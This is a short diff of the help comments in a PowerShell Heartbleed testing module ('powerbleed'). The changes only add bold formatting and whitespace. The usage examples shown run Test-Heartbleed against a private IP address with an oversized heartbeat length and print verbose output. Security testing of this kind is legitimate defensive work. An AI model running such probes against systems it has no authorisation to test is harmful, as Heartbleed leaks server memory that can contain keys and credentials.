@@ -81,23 +81,24 @@ http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html
 
 .NOTES
 
-Author: Joff Thyer, April 2014
-Version: 20140501-1011
-Acknowledgments to Tim Tomes.
+**Author: Joff Thyer, April 2014**
+**Version: 20140501-1011** 
+**Acknowledgments to Tim Tomes.**
 
 .EXAMPLE
 
 Usage example within CMD.EXE only.  Assumes that module is contained within
 current working directory.
 
-C:\>    powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose
+C:\>        powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose
 
 
 Powershell interactive usage examples:
 
-PS C:\>     Import-Module ./powerbleed.psm1
+PS C:\>         Import-Module ./powerbleed.psm1
 
-PS C:\>     Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 5 -HBLen 32767 -Verbose
+PS C:\>         Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 5 -HBLen 32767 -Verbose
+
 VERBOSE: Testing 10.10.1.150
 VERBOSE: Sending Heartbeat support test packet
 VERBOSE: Connection attempt number: 1
